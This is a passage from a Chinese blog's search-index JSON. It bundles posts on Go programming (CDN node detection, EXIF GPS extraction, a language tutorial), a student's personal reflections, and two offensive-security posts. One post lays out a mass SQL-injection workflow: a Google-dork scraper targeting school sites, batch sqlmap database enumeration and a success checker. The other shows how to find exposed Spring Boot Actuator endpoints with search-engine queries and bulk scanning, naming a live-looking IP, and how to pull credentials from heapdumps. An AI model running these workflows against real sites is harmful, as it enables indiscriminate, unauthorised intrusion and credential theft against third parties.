&quot;baidu.com&quot;\tCdnIp := map[string]string&#123; &quot;https://ips-app-vrdhcyxprn.us-west-1.fcapp.run&quot;: &quot;美国-硅⾕&quot;, &quot;https://ips-app-vrdhcyxprn.ap-southeast-5.fcapp.run&quot;: &quot;新加坡&quot;, &quot;https://ips-app-vrdhcyxprn.eu-west-1.fcapp.run&quot;: &quot;欧洲-伦敦&quot;, &quot;https://ips-app-vrdhcyxprn.eu-central-1.fcapp.run&quot;: &quot;欧洲-法兰克福&quot;, &quot;https://ips-app-vrdhcyxprn.ap-southeast-7.fcapp.run&quot;: &quot;印度尼⻄亚-雅加达&quot;, &quot;https://ips-app-vrdhcyxprn.ap-southeast-1.fcapp.run&quot;: &quot;印度尼⻄亚-雅加达&quot;, &quot;https://ips-app-vrdhcyxprn.ap-southeast-3.fcapp.run&quot;: &quot;印度尼⻄亚-雅加达&quot;, &quot;https://ips-app-nnrrqmtriz.cn-shenzhen.fcapp.run&quot;: &quot;中国-深圳&quot;, &quot;https://ips-app-vrdhcyxprn.cn-chengdu.fcapp.run&quot;: &quot;中国-成都&quot;, &quot;https://ips-app-nnrrjaztiz.cn-hangzhou.fcapp.run&quot;: &quot;中国-杭州&quot;, &quot;https://ips-app-vrdhcyxprn.cn-zhangjiakou.fcapp.run&quot;: &quot;中国-张家⼝&quot;, &quot;https://ips-app-vrdhcyxprn.ap-northeast-2.fcapp.run&quot;: &quot;韩国-⾸尔&quot;, &quot;https://ips-app-nnrrjaztiz.cn-beijing.fcapp.run&quot;: &quot;中国-北京&quot;, &quot;https://ips-app-vrdhcyxprn.cn-huhehaote.fcapp.run&quot;: &quot;中国-呼和浩特&quot;, &quot;https://ips-app-nnrrjaztiz.cn-hongkong.fcapp.run&quot;: &quot;中国-⾹港&quot;, &quot;https://ips-app-nnrrjaztiz.cn-qingdao.fcapp.run&quot;: &quot;中国-⻘岛&quot;,\t&#125;\tclient := req.C()\tclient.SetTimeout(5 * time.Second) // 设置超时时间为5秒\treqChan := make(chan CDNResult, len(CdnIp)) // 使用缓冲通道\tvar wg sync.WaitGroup\t// 启动一个goroutine来等待所有请求完成并关闭channel\tgo func() &#123; wg.Wait() close(reqChan)\t&#125;()\tfor url, region := range CdnIp &#123; wg.Add(1) go func(url, region string) &#123; defer wg.Done() // 为每个请求创建新的请求实例 req := client.R() result := CDNResult&#123; Region: region, Status: &quot;检测失败&quot;, // 默认状态 &#125; req.SetQueryParam(&quot;domain&quot;, ip) resp, err := req.Get(url) if err != nil &#123; fmt.Printf(&quot;请求 %s 失败: %v &quot;, region, err) reqChan &lt;- result return &#125; if resp.String() != &quot;&quot; &#123; result.IPList = strings.Split(resp.String(), &quot;,&quot;) result.IPCount = len(result.IPList) result.Status = &quot;检测成功&quot; &#125; reqChan &lt;- result &#125;(url, region)\t&#125;\t// 收集结果并统计\tsuccessCount := 0\tfor result := range reqChan &#123; ipListStr := &quot;-&quot; if len(result.IPList) &gt; 0 &#123; ipListStr = strings.Join(result.IPList, &quot;, &quot;) if len(ipListStr) &gt; 37 &#123; ipListStr = ipListStr[:34] + &quot;...&quot; &#125; &#125; ipCount := &quot;-&quot; if result.Status == &quot;检测成功&quot; &#123; ipCount = fmt.Sprintf(&quot;%d&quot;, result.IPCount) successCount++ &#125; fmt.Println(result.Region, result.Status, ipListStr, ipCount)\t&#125;\tfmt.Println(&quot;+------------+----------+---------------------------------------+------------+&quot;)\tif successCount == 0 &#123; fmt.Println(&quot;所有节点检测失败&quot;)\t&#125; else &#123; fmt.Printf(&quot;成功检测到 %d 个节点 (共 %d 个节点) &quot;, successCount, len(CdnIp))\t&#125;&#125; EXIF 信息获取Exif是⼀种图像⽂件格式，实际上Exif格式就是在JPEG格式头部插⼊了数码照⽚的信息，包括拍摄时的光圈、快⻔、⽩平衡、ISO、焦距、⽇期时间等各种和拍摄条件以及相机品牌、型号、⾊彩编码、拍摄时录制的声⾳以及GPS全球定位系统数据、缩略图等。你可以利⽤任何可以查看JPEG⽂件的看图软件浏览Exif格式的照⽚，但并不是所有的图形程序都能处理Exif信息。 EXIF元信息被组织成⼀个图像中的不同图像⽂件⽬录（IFD）。这些IFD的名称与ExifTool系列1组的名称相对应。写⼊EXIF信息时，除⾮指定了另⼀个组，否则将使⽤下⾯列出的默认组。 创建新的IFD时，可以使⽤默认值⾃动添加强制标签（在Writable类型之后⽤冒号表示），如果仅保留默认值的强制标签，则在删除标签时会⾃动删除IFD。 安装 goexif 库1go get -u github.com/rwcarlsen/goexif/exif 解析 EXIF 格式图片1234567891011121314151617181920func main() &#123;\tfname := &quot;sample.jpg&quot;\tf, err := os.Open(fname)\tif err != nil &#123; log.Fatal(err)\t&#125;\t// 注册相机makernote解析器\texif.RegisterParsers(mknote.All...)\tx, err := exif.Decode(f)\tif err != nil &#123; log.Fatal(&quot;解析Exif失败&quot;, err)\t&#125;\ttm, _ := x.DateTime()\tfmt.Println(&quot;Taken: &quot;, tm)\t// 获得经纬度\tlat, long, err := x.LatLong()\tfmt.Println(lat, long)&#125; 获取了经纬度我们可以利用高德获取地理位置https://lbs.amap.com/api/webservice/guide/api/georegeo#t5 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980package mainimport (\t&quot;encoding/json&quot;\t&quot;fmt&quot;\t&quot;github.com/imroc/req/v3&quot;\t&quot;github.com/rwcarlsen/goexif/exif&quot;\t&quot;github.com/rwcarlsen/goexif/mknote&quot;\t&quot;log&quot;\t&quot;os&quot;\t&quot;strconv&quot;)type GDResponse struct &#123; // 修改结构体名称避免冲突\tStatus string `json:&quot;status&quot;`\tInfo string `json:&quot;info&quot;`\tRegeocode struct &#123; FormattedAddress string `json:&quot;formatted_address&quot;`\t&#125; `json:&quot;regeocode&quot;`&#125;func GetLatLong(latitude, longitude float64) string &#123;\t// 注意：高德地图API要求&quot;经度,纬度&quot;顺序\tformattedLongitude := strconv.FormatFloat(longitude, &#x27;f&#x27;, 6, 64)\tformattedLatitude := strconv.FormatFloat(latitude, &#x27;f&#x27;, 6, 64)\treturn formattedLongitude + &quot;,&quot; + formattedLatitude&#125;func main() &#123;\tfname := &quot;sample.jpg&quot;\tf, err := os.Open(fname)\tif err != nil &#123; log.Fatal(err)\t&#125;\tdefer f.Close() // 记得关闭文件\t// 注册相机makernote解析器\texif.RegisterParsers(mknote.All...)\tx, err := exif.Decode(f)\tif err != nil &#123; log.Fatal(&quot;解析Exif失败: &quot;, err)\t&#125;\ttm, _ := x.DateTime()\tfmt.Println(&quot;Taken: &quot;, tm)\t// 获得经纬度\tlat, long, err := x.LatLong()\tif err != nil &#123; log.Fatal(&quot;获取经纬度失败: &quot;, err)\t&#125;\tlatLong := GetLatLong(lat, long)\t// 高德地图 key\tak := &quot;*****&quot;\tclient := req.C()\trequest := client.R()\trequest.SetQueryParams(map[string]string&#123; &quot;key&quot;: ak, &quot;location&quot;: latLong,\t&#125;)\tresponse, err := request.Get(&quot;https://restapi.amap.com/v3/geocode/regeo&quot;)\tif err != nil &#123; log.Fatal(&quot;高德地图API请求失败: &quot;, err)\t&#125;\tvar gdResp GDResponse // 使用不同的变量名\tif response.IsSuccessState() &#123; if err := json.Unmarshal(response.Bytes(), &amp;gdResp); err != nil &#123; log.Fatal(&quot;高德地图API解析失败: &quot;, err) &#125; if gdResp.Status == &quot;1&quot; &#123; fmt.Println(&quot;高德地图解析成功, 地理位置为: &quot; + gdResp.Regeocode.FormattedAddress) &#125; else &#123; log.Fatal(&quot;高德地图解析失败: &quot;, gdResp.Info) &#125;\t&#125;&#125;","tags":["go 开发"],"categories":["开发"]},{"title":"SpringBoot 泄漏","path":"/2024/12/11/src/SpringBoot 泄漏/","content":"Actuator 泄漏 Spring Boot Actuator 是一个强大的监控和管理框架，它提供了一系列的监控端点，可以用于获取应用程序的状态、度量指标、健康检查、配置信息等。Actuator 的监控端点可以通过 HTTP 请求访问，并返回有关应用程序运行时信息的响应。 使用 Actuator 可以方便地了解应用程序的运行状况，监控关键指标，并根据需要采取相应的措施。它为开发人员和运维人员提供了一种简单而有效的方式来监控和管理 Spring Boot 应用程序。 https://www.freebuf.com/vuls/407651.html 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869/actuator查看有哪些 Actuator端点是开放的。/actuator/auditeventauditevents端点提供有关应用程序审计事件的信息。/actuator/beansbeans端点提供有关应用程序 bean 的信息。/actuator/conditionsconditions端点提供有关配置和自动配置类条件评估的信息。/actuator/configpropsconfigprops端点提供有关应用程序@ConfigurationPropertiesbean的信息。/actuator/env 查看全部环境属性，可以看到 SpringBoot 载入哪些 properties，以及 properties 的值（会自动用*替换 key、password、secret 等关键字的 properties 的值）。/actuator/flywayflyway端点提供有关 Flyway 执行的数据库迁移的信息。/actuator/health 端点提供有关应用程序运行状况的health详细信息。/actuator/heapdumpheapdump端点提供来自应用程序 JVM 的堆转储。(通过分析查看/env端点被*号替换到数据的具体值。)/actuator/httptracehttptrace端点提供有关 HTTP 请求-响应交换的信息。（包括用户HTTP请求的Cookie数据，会造成Cookie泄露等）。/actuator/infoinfo端点提供有关应用程序的一般信息。/actuator/integrationgraphintegrationgraph端点公开了一个包含所有 Spring Integration 组件的图。/actuator/liquibaseliquibase端点提供有关 Liquibase 应用的数据库更改集的信息。/actuator/logfilelogfile端点提供对应用程序日志文件内容的访问。/actuator/loggersloggers端点提供对应用程序记录器及其级别配置的访问。/actuator/mappingsmappings端点提供有关应用程序请求映射的信息。/actuator/metricsmetrics端点提供对应用程序指标的访问。/actuator/prometheus端点以prometheusPrometheus 服务器抓取所需的格式提供 Spring Boot 应用程序的指标。/actuator/quartzquartz端点提供有关由 Quartz 调度程序管理的作业和触发器的信息。/actuator/scheduledtasksscheduledtasks端点提供有关应用程序计划任务的信息。/actuator/sessionssessions端点提供有关由 Spring Session 管理的应用程序 HTTP 会话的信息。/actuator/startupstartup端点提供有关应用程序启动顺序的信息。/actuator/shutdownshutdown端点用于关闭应用程序 漏洞利用如何找到互联网上的Spring框架，ZoomEye语法如下： 1app:&quot;Spring Framework&quot; Fofa语法如下： 1icon_hash=&quot;116323821&quot;||body=&quot;Whitelabel Error Page&quot; 然后fofa导出数据，用曾哥的工具批量扫 1SpringBoot-Scan -uf url.txt 比如扫到一个 Actuator 泄漏 http://112.74.56.123:60021/actuator 可以下载一下 &#x2F;actuator&#x2F;heapdump Heap Dump也叫堆转储文件，是一个Java进程在某个时间点上的内存快照。Heap Dump是有着多种类型的。不过总体上heap dump在触发快照的时候都保存了java对象和类的信息。通常在写heap dump文件前会触发一次FullGC，所以heap dump文件中保存的是FullGC后留下的对象信息。我们可以通过Heap Dump做哪些事情？ 一般在Heap Dump文件中可以获取到（这仍然取决于heap dump文件的类型）如下信息： 对象信息：类、成员变量、直接量以及引用值；类信息：类加载器、名称、超类、静态成员；Garbage Collections Roots：JVM可达的对象；线程栈以及本地变量：获取快照时的线程栈信息，以及局部变量的详细信息。一般在渗透测试中我们会通过Eclipse MemoryAnalyzer工具对泄露的heapdump文件进行分析，查询加载到内存中的明文密码信息,比如redis密码,mysql数据库账号和密码。但是这样可能导致获取的敏感信息不全面，甚至无法获取到敏感信息，今天推荐一款自动化分析heapdumo的工具 - JDumpSpider。 可以得到一下信息 12345678910111213141516数据源 SpringDataSourceProperties WeblogicDataSourceConnectionPoolConfig MongoClient AliDruidDataSourceWrapper配置文件信息 MapPropertySource OriginTrackedMapPropertySource MutablePropertySource ConsulPropertySource OSS（模糊搜索）Redis配置 RedisStandaloneConfiguration JedisClientShiroKey CookieRememberMeManager 1java -jar JDumpSpider-1.1-SNAPSHOT-full.jar /Users/she11f/Downloads/heapdump","tags":["src"],"categories":["src","SpringBoot"]},{"title":"批量挖掘 sql 注入","path":"/2024/12/09/src/批量挖掘sql注入/","content":"sql 注入脚本 查询脚本 search.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import requestsfrom lxml import etreeimport timedef create_requests(page,data): url=&quot;https://www.google.com/search?q=&quot;+data+&quot;&amp;lr=lang_zh-CN&amp;start=&#123;&#125;&quot;.format(page)+&quot;&amp;ie=utf-8&quot; header=&#123; &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36&quot; &#125; proxy=&#123; &quot;http&quot;:&quot;127.0.0.1:10809&quot;, &quot;https&quot;:&quot;127.0.0.1:10809&quot; &#125; response=requests.get(url=url,headers=header,proxies=proxy) response.encoding=&quot;utf-8&quot; context=response.text return contextdef parse_data(context): parse=etree.HTML(context) data=parse.xpath(&#x27;//*/@href&#x27;) f=open(r&quot;url.txt&quot;,&quot;a&quot;) for url in data: if &quot;/search?&quot; in url: continue if &quot;google.com&quot; in url: continue if &quot;.jpg&quot; in url: continue if &quot;jpeg&quot; in url: continue if &quot;png&quot; in url: continue if &quot;#&quot; in url: continue if &quot;%&quot; in url: continue if &quot;url=https://&quot; in url: continue if &quot;url=http://&quot; in url: continue if &quot;.pdf&quot; in url: continue if &quot;.htm&quot; in url: continue if &quot;.htmls&quot; in url: continue if &quot;.html&quot; in url: continue if &quot;.gov.cn&quot; in url: continue break f.write(url+&quot; &quot;) print(url+&quot;成功写入&quot;) f.close()if __name__ == &#x27;__main__&#x27;: data = input(&quot;请输入Google语法:&quot;) print(&quot;----------------------开始抓取----------------------&quot;) for page in range(0,int(input(&quot;请输入结束页面的倍数:&quot;)),10): context=create_requests(page,data) parse_data(context) print(&quot;----------------------抓取完毕----------------------&quot;) 允许输入谷歌语法关键词 intext:学校 inurl:&quot;php?id&quot;|&quot;do?id&quot;|&quot;asp?id&quot; 然后我们就能发现 url.txt 文件下已经爬到了我们想要的域名，接下来交给 sqlmap 批量跑 123456789sqlmap -m url.txt --dbs --batch --random-agent -p &quot;id&quot; --output-dir result --force-ssl --proxy http://127.0.0.1:8080-m批量操作--dbs数据库名--batch自动选择yes--random-agent不再使用默认User-Agent，随机使用User-Agent-p参数--output-dir输出结果文件夹--force-ssl --proxy http://127.0.0.1:8080 为了能扫描https，用bp代理本地8080端口 如果 result 文件夹下的每个结果里的 log 文件不为空说明有结果了,所以扫描结束后可以写一个检测脚本 exits.py 123456789101112131415161718import osimport shutildef get_exists(path,sum): sum=0 for root,dirs,files in os.walk(path): log_path=os.path.join(root,&quot;log&quot;) if os.path.isfile(log_path) and os.path.getsize(log_path)==0: shutil.rmtree(root) else: sum+=1 print(root+&quot;\\t注入成功&quot;) continue return sumif __name__ == &#x27;__main__&#x27;: path=r&quot;/Users/she11f/Documents/Code/Python/script/sql_auto/result&quot; print(&quot;--------------------开启执行--------------------&quot;) sum=get_exists(path,sum) print(&quot;--------------------成功找到&#123;&#125;注入点--------------------&quot;.format(sum))","tags":["src"],"categories":["src","sql"]},{"path":"/2024/10/07/work/保研感悟/","content":"关于未来的一些计划 时间飞逝，转眼就大四了。可以感受到大家的迷茫和紧迫感，不过幸运的是我保研了，虽然保研的院校和专业和我预想的不太一样，但是可能对我来说是最好的结果了，包括大四这一年我可以多出四年的缓冲时间，在这段时间里我可以更好的思考未来道路，或继续学习网络安全，或考公，或科研。 我暂时把绿盟的工作辞掉了，飞哥说我想回来就回来，会替我暂时保留工位到明年开学。非常感谢南昌绿盟各位大佬厚爱，他们在工作，生活上都是非常照顾我，我辞职的原因是由于自己手上有一堆事情暂时忙不过来，等忙完手上的事肯定是要继续去工作的。 生活为什么是生活第一位呢，因为我觉得所有的一切都是为了生活更加幸福而服务的。首先就是锻炼身体了，和室友一起办了一张健身房的年卡，我要变的更大更强！！！（指肌肉 还有多陪家人，多和家人打打视频电话，到处转转旅游起来。 学习大四的话，目前的想法是带着社团的学弟们打一打比赛，然后我自己学一学安全开发为毕设做准备，继续钻研代码审计（php，java），最后也是想多打一些比赛多结识一些志同道合的小伙伴们。 关于研究生的暂时打算是，直接把学业放一放，开始学习渗透方面的知识。因为迄今为止我更多的还是参加 CTF 比赛，对于实战感觉接触的还是不够多，后期估计会找直播课来学习，然后就是自己多参加一些项目丰富自己的简历以及阅历。其次就是准备考公务员了，行测申论的这些可以研一就刷起来（其实我最想进的就是那种打比赛的公务员岗位，有网警特招的话也是再好不过了） 不论怎样最重要的都是提升自己的技术，保持学习，待时而动！ 总结想摆烂，想以后的工作活少钱多离家近，所以努力吧少年！！！还有还有，爱你们😘！！！ 无题she11f回头看，轻舟已过万重山。向前看，前途漫漫亦灿灿。十月七日","tags":["生活"],"categories":["打工人的三两事"]},{"title":"go 入门","path":"/2024/10/06/go/开发/入门/","content":"第一个程序 hello world123456package mainimport &quot;fmt&quot;func main() &#123;\tfmt.Println(&quot;Hello World&quot;)&#125; go run hello.go 执行程序代码 基础语法，初识函数，基本类型package我们看到程序的第一行是 package main,在Go语言中，包（Package） 是一种用于组织代码的机制，用于将相关的函数、类型和变量等组织在一起，以便于模块化开发和代码复用。包的使用能够使程序结构更加清晰、可维护性更高，同时也是Go语言强调的一项重要特性 func在go里面，当函数名开头是小写的话，意思这个函数只能在当前包用，是私有的，只能在包的内部使用，如果是大写，则公有，可以导出食用。 基本类型字符串Go语言中的字符串以原生数据类型出现，使用字符串就像使用其他原生数据类型（int、bool、float32、float64 等）一样。 Go 语言里的字符串的内部实现使用UTF-8编码。 字符串的值为双引号(“)中的内容。 1234s1 := &quot;aaa&quot;fmt.Println(s1)&gt; aaa 字符组成每个字符串的元素叫做“字符”，可以通过遍历或者单个获取字符串元素获得字符。 字符用单引号（’）包裹起来，如： 12var a := &#x27;中&#x27;var b := &#x27;x&#x27; 字符类型在 go 中是 rune，rune类型实际是一个int32，可以表示一个 unicode 码点 1234s1 := &quot;a&quot;fmt.Println(s1)&gt; 97 整形整型分为以下两个大类： 按长度分为：int8、int16、int32、int64对应的无符号整型：uint8、uint16、uint32、uint64 其中，uint8就是我们熟知的byte型，int16对应C语言中的short型，int64对应C语言中的long型。 浮点型Go语言支持两种浮点型数：float32和float64。这两种浮点型数据格式遵循IEEE 754标准： float32 的浮点数的最大范围约为3.4e38，可以使用常量定义：math.MaxFloat32。 float64 的浮点数的最大范围约为 1.8e308，可以使用一个常量定义：math.MaxFloat64。 布尔值Go语言中以bool类型进行声明布尔型数据，布尔型数据只有true（真）和false（假）两个值。 1234567注意：布尔类型变量的默认值为false。Go 语言中不允许将整型强制转换为布尔型.布尔型无法参与数值运算，也无法与其他类型进行转换。 变量声明12345678910var s1 strings1 = &quot;aaa&quot;s2 := &quot;aaa&quot;var s3, s4 strings5,s6 := &quot;G&quot;,&quot;o&quot;// 使用匿名变量来忽略函数的返回值、临时存储值，以及在需要忽略某些返回值的情况下使用。请注意，匿名变量不能被重新赋值或在其他地方使用，作用仅限于被声明的位置。_, _ = 10, 20 运算符Go 语言内置的运算符有： 12345算术运算符关系运算符逻辑运算符位运算符赋值运算符 算数运算符 运算符 描述 + 相加 - 相减 * 相乘 &#x2F; 相除 % 求余 注意： ++（自增）和–（自减）在Go语言中是单独的语句，并不是运算符。 关系运算符 运算符 描述 &#x3D;&#x3D; 检查两个值是否相等，如果相等返回 True 否则返回 False。 !&#x3D; 检查两个值是否不相等，如果不相等返回 True 否则返回 False。 &gt; 检查左边值是否大于右边值，如果是返回 True 否则返回 False。 &gt;&#x3D; 检查左边值是否大于等于右边值，如果是返回 True 否则返回 False。 &lt; 检查左边值是否小于右边值，如果是返回 True 否则返回 False。 &lt;&#x3D; 检查左边值是否小于等于右边值，如果是返回 True 否则返回 False。 逻辑运算符 运算符 描述 &amp;&amp; 逻辑 AND 运算符。 如果两边的操作数都是 True，则为 True，否则为 False。 ll 逻辑 OR 运算符。 如果两边的操作数有一个 True，则为 True，否则为 False。 ! 逻辑 NOT 运算符。 如果条件为 True，则为 False，否则为 True。 位运算符位运算符对整数在内存中的二进制位进行操作。 运算符 描述 &amp; 参与运算的两数各对应的二进位相与。（两位均为1才为1） l 参与运算的两数各对应的二进位相或。（两位有一个为1就为1） ^ 参与运算的两数各对应的二进位相异或，当两对应的二进位相异时，结果为1。（两位不一样则为1） &lt;&lt; 左移n位就是乘以2的n次方。“a&lt;&lt;b”是把a的各二进位全部左移b位，高位丢弃，低位补0。 &gt;&gt; 右移n位就是除以2的n次方。“a&gt;&gt;b”是把a的各二进位全部右移b位。 赋值运算符 运算符 描述 &#x3D; 简单的赋值运算符，将一个表达式的值赋给一个左值 +&#x3D; 相加后再赋值 -&#x3D; 相减后再赋值 *&#x3D; 相乘后再赋值 &#x2F;&#x3D; 相除后再赋值 %&#x3D; 求余后再赋值 &lt;&lt;&#x3D; 左移后赋值 &gt;&gt;&#x3D; 右移后赋值 &amp;&#x3D; 按位与后赋值 l&#x3D; 按位或后赋值 ^&#x3D; 按位异或后赋值 数组ArrayGolang Array和以往认知的数组有很大不同。数组长度必须是常量，且是类型的组成部分。一旦定义，长度不能变。 1234arrs := [3]int&#123;1, 2, 3&#125;arr := [...]int&#123;1, 2&#125;c := [5]int&#123;3: 100, 4: 500&#125;d := [2][3]int&#123;&#123;1, 2, 3&#125;, &#123;4, 5, 6&#125;&#125; 长度是数组类型的一部分，因此，var a[5] int和var a[10]int是不同的类型。 切片Slice需要说明，slice 并不是数组或数组指针。它通过内部指针和相关属性引用数组片段，以实现变长方案,所以可以说切片是一个动态数组 12345s1 := []int&#123;1, 2, 3&#125;s1 = append(s1, 1234)s3 := make([]int, 5)fmt.Println(s1,s3) 指针区别于C&#x2F;C++中的指针，Go语言中的指针不能进行偏移和运算，是安全指针。 Go语言中的函数传参都是值拷贝，当我们想要修改某个变量的时候，我们可以创建一个指向该变量地址的指针变量。传递数据使用指针，而无须拷贝数据。类型指针不能进行偏移和运算。Go语言中的指针操作非常简单，只需要记住两个符号：&amp;（取地址）和*（根据地址取值）。 指针地址和指针类型每个变量在运行时都拥有一个地址，这个地址代表变量在内存中的位置。Go语言中使用&amp;字符放在变量前面对变量进行“取地址”操作。 Go语言中的值类型（int、float、bool、string、array、struct）都有对应的指针类型，如：*int、*int64、*string等。 取变量指针的语法如下： 1234ptr := &amp;v // v的类型为Tv:代表被取地址的变量，类型为Tptr:用于接收地址的变量，ptr的类型就为*T，称做T的指针类型。*代表指针。 12345a := 10 b := &amp;a fmt.Printf(&quot;a:%d ptr:%p &quot;, a, &amp;a) // a:10 ptr:0xc00001a078 fmt.Printf(&quot;b:%p type:%T &quot;, b, b) // b:0xc00001a078 type:*int fmt.Println(&amp;b) // 0xc00000e018 指针取值在对普通变量使用&amp;操作符取地址后会获得这个变量的指针，然后可以对指针使用*操作，也就是指针取值，代码如下。 1234567891011//指针取值 a := 10 b := &amp;a // 取变量a的地址，将指针保存到b中 fmt.Printf(&quot;type of b:%T &quot;, b) c := *b // 指针取值（根据指针去内存取值） fmt.Printf(&quot;type of c:%T &quot;, c) fmt.Printf(&quot;value of c:%v &quot;, c)type of b:*int type of c:int value of c:10 总结： 取地址操作符&amp;和取值操作符*是一对互补操作符，&amp;取出地址，*根据地址取出地址指向的值。 变量、指针地址、指针变量、取地址、取值的相互关系和特性如下：\\ 对变量进行取地址（&amp;）操作，可以获得这个变量的指针变量 指针变量的值是指针地址。 对指针变量进行取值（*）操作，可以获得指针变量指向的原变量的值。 123456789101112131415func modify1(x int) &#123; x = 100&#125;func modify2(x *int) &#123; *x = 100&#125;func main() &#123; a := 10 modify1(a) fmt.Println(a) // 10 modify2(&amp;a) fmt.Println(a) // 100&#125; 空指针 当一个指针被定义后没有分配到任何变量时，它的值为 nil 空指针的判断 12345678var p *string fmt.Println(p) fmt.Printf(&quot;p的值是%s/n&quot;, p) if p != nil &#123; fmt.Println(&quot;非空&quot;) &#125; else &#123; fmt.Println(&quot;空值&quot;) &#125; Mapmap是一种无序的基于key-value的数据结构，Go语言中的map是引用类型，必须初始化才能使用。 map定义Go语言中 map的定义语法如下 1map[KeyType]ValueType 其中 12KeyType:表示键的类型。ValueType:表示键对应的值的类型。 map类型的变量默认初始值为nil，需要使用make()函数来分配内存。语法为： 1make(map[KeyType]ValueType, [cap]) 其中cap表示map的容量，该参数虽然不是必须的，但是我们应该在初始化map的时候就为其指定一个合适的容量。 map基本使用map中的数据都是成对出现的，map的基本使用示例代码如下： 12345678func main() &#123; scoreMap := make(map[string]int, 8) scoreMap[&quot;张三&quot;] = 90 scoreMap[&quot;小明&quot;] = 100 fmt.Println(scoreMap) fmt.Println(scoreMap[&quot;小明&quot;]) fmt.Printf(&quot;type of a:%T &quot;, scoreMap)&#125; 123map[小明:100 张三:90]100type of a:map[string]int map也支持在声明的时候填充元素，例如： 12345scoreMap := map[string]int&#123;\t&quot;A&quot;: 100,\t&quot;B&quot;: 60,&#125;fmt.Println(scoreMap) 判断某个键是否存在Go语言中有个判断map中键是否存在的特殊写法，格式如下: 1value, ok := map[key] 举个例子： 12345678910111213141516\tvalue,ok := scoreMap[&quot;A&quot;]\tif ok&#123; fmt.Println(value)\t&#125; else &#123; fmt.Println(&quot;not exist&quot;)\t&#125;\tvalues,okk := scoreMap[&quot;C&quot;]\tif okk&#123; fmt.Println(values)\t&#125; else &#123; fmt.Println(&quot;not exist&quot;)\t&#125;100not exist map的遍历Go语言中使用for range遍历map。 123for k, v := range scoreMap &#123;\tfmt.Println(k,v)&#125; 或者只遍历 key 123for k := range scoreMap &#123; fmt.Println(k) &#125; 使用delete()函数删除键值对使用delete()内建函数从map中删除一组键值对，delete()函数的格式如下： 1delete(map, key) 其中， 12map:表示要删除键值对的mapkey:表示要删除的键值对的键 结构体Go语言中的基础数据类型可以表示一些事物的基本属性，但是当我们想表达一个事物的全部或部分属性时，这时候再用单一的基本数据类型明显就无法满足需求了，Go语言提供了一种自定义数据类型，可以封装多个基本数据类型，这种数据类型叫结构体，英文名称struct。 也就是我们可以通过struct来定义自己的类型了。 Go语言中通过struct来实现面向对象。 结构体的定义使用type和struct关键字来定义结构体，具体代码格式如下： 12345type 类型名 struct &#123; 字段名 字段类型 字段名 字段类型 …&#125; 其中： 1231.类型名：标识自定义结构体的名称，在同一个包内不能重复。2.字段名：表示结构体字段名。结构体中的字段名必须唯一。3.字段类型：表示结构体字段的具体类型。 举个例子，我们定义一个Person（人）结构体，代码如下： 12345type person struct &#123; name string city string age int8&#125; 同样类型的字段也可以写在一行， 1234type person1 struct &#123; name, city string age int8&#125; 这样我们就拥有了一个person的自定义类型，它有name、city、age三个字段，分别表示姓名、城市和年龄。这样我们使用这个person结构体就能够很方便的在程序中表示和存储人信息了。 语言内置的基础数据类型是用来描述一个值的，而结构体是用来描述一组值的。比如一个人有名字、年龄和居住城市等，本质上是一种聚合型的数据类型 结构体实例化只有当结构体实例化时，才会真正地分配内存。也就是必须实例化后才能使用结构体的字段。 结构体本身也是一种类型，我们可以像声明内置类型一样使用var关键字声明结构体类型。 1var 结构体实例 结构体类型 基本实例化1234567891011121314type person struct &#123; name string city string age int8&#125;func main() &#123; var p1 person p1.name = &quot;pprof.cn&quot; p1.city = &quot;北京&quot; p1.age = 18 fmt.Printf(&quot;p1=%v &quot;, p1) //p1=&#123;pprof.cn 北京 18&#125; fmt.Printf(&quot;p1=%#v &quot;, p1) //p1=main.person&#123;name:&quot;pprof.cn&quot;, city:&quot;北京&quot;, age:18&#125;&#125; 我们通过.来访问结构体的字段（成员变量）,例如p1.name和p1.age等。 指针类型结构体我们还可以通过使用new关键字对结构体进行实例化，得到的是结构体的地址。 格式如下： 123var p2 = new(person) fmt.Printf(&quot;%T &quot;, p2) //*main.person fmt.Printf(&quot;p2=%#v &quot;, p2) //p2=&amp;main.person&#123;name:&quot;&quot;, city:&quot;&quot;, age:0&#125; 使用&amp;对结构体进行取地址操作相当于对该结构体类型进行了一次new实例化操作。 1234567p3 := &amp;person&#123;&#125;fmt.Printf(&quot;%T &quot;, p3) //*main.personfmt.Printf(&quot;p3=%#v &quot;, p3) //p3=&amp;main.person&#123;name:&quot;&quot;, city:&quot;&quot;, age:0&#125;p3.name = &quot;博客&quot;p3.age = 30p3.city = &quot;成都&quot;fmt.Printf(&quot;p3=%#v &quot;, p3) //p3=&amp;main.person&#123;name:&quot;博客&quot;, city:&quot;成都&quot;, age:30&#125; p3.name &#x3D; “博客”其实在底层是(*p3).name &#x3D; “博客”，这是Go语言帮我们实现的语法糖。 占位符通用型*printf系列函数都支持format格式化参数，在这里我们按照占位符将被替换的变量类型划分，方便查询和记忆。 占位符 说明 %v 值的默认格式表示 %+v 类似%v，但输出结构体时会添加字段名 %#v 值的Go语法表示 %T 打印值的类型 %% 百分号 整形 占位符 说明 %b 表示为二进制 %c 该值对应的unicode码值 %d 表示为十进制 %o 表示为八进制 %x 表示为十六进制，使用a-f %X 表示为十六进制，使用A-F %U 表示为Unicode格式：U+1234，等价于”U+%04X” %q 该值对应的单引号括起来的go语法字符字面值，必要时会采用安全的转义表示 布尔型 占位符 说明 %t true或false 浮点数与复数 占位符 说明 %b 无小数部分、二进制指数的科学计数法，如-123456p-78 %e 科学计数法，如-1234.456e+78 %E 科学计数法，如-1234.456E+78 %f 有小数部分但无指数部分，如123.456 %F 等价于%f %g 根据实际情况采用%e或%f格式（以获得更简洁、准确的输出） %G 根据实际情况采用%E或%F格式（以获得更简洁、准确的输出） 字符串和[]byte 占位符 说明 %s 直接输出字符串或者[]byte %q 该值对应的双引号括起来的go语法字符串字面值，必要时会采用安全的转义表示 %x 每个字节用两字符十六进制数表示（使用a-f %X 每个字节用两字符十六进制数表示（使用A-F） 指针 占位符 说明 %p 表示为十六进制，并加上前导的0x 宽度标识符 占位符 说明 %f 默认宽度，默认精度 %9f 宽度9，默认精度 %.2f 默认宽度，精度2 %9.2f 宽度9，精度2 %9.f 宽度9，精度0 其他 flag 占位符 说明 ’+’ 